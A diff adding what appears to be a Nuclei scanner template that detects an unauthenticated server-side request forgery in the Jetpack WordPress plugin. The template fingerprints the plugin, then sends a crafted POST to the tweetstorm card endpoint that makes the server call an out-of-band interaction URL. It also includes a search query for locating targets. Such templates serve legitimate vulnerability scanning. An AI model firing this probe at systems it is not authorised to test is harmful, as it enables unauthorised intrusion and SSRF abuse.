@@ -1,0 +1,47 @@
+id: wp-jetpack-ssrf
+
+info:
+  name: Wordpress Jetpack plugin - Server Side Request Forgery
+  author: pussycat0x
+  severity: medium
+  description: |
+    The Jetpack WordPress plugin exposes an endpoint that fetches external URLs provided via the 'urls' parameter to retrieve Twitter (X) card descriptions/metadata. This allows unauthenticated SSRF, enabling attackers to force the server to request attacker-controlled URLs
+  metadata:
+    verified: false
+    max-request: 2
+    fofa-query: body= "/wp-content/plugins/jetpack/"
+  tags: wordpress,wp-plugin,wp-scan,jeckpack,ssrf
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/jetpack/readme.txt"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Jetpack - WP Security"
+        internal: true
+
+  - raw:
+      - |
+        POST /wp-json/wpcom/v2/tweetstorm/generate-cards HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+
+        {
+        "urls": ["http://{{interactsh-url}}"]
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body, "no_og_data")
+          - contains(interactsh_protocol,'http')
+          - status_code == 200
+        condition: and
+# digest: 4a0a0047304502202d6357263c8b0eed8c990b4ce264eac25aaa0cda8428610f5f9ca98ac81478f0022100aa9b2e35346fce493f2dcd3c6a532444c042dcf792ae969ea387330cf6502e03:922c64590222798bb761d5b6d8e72950
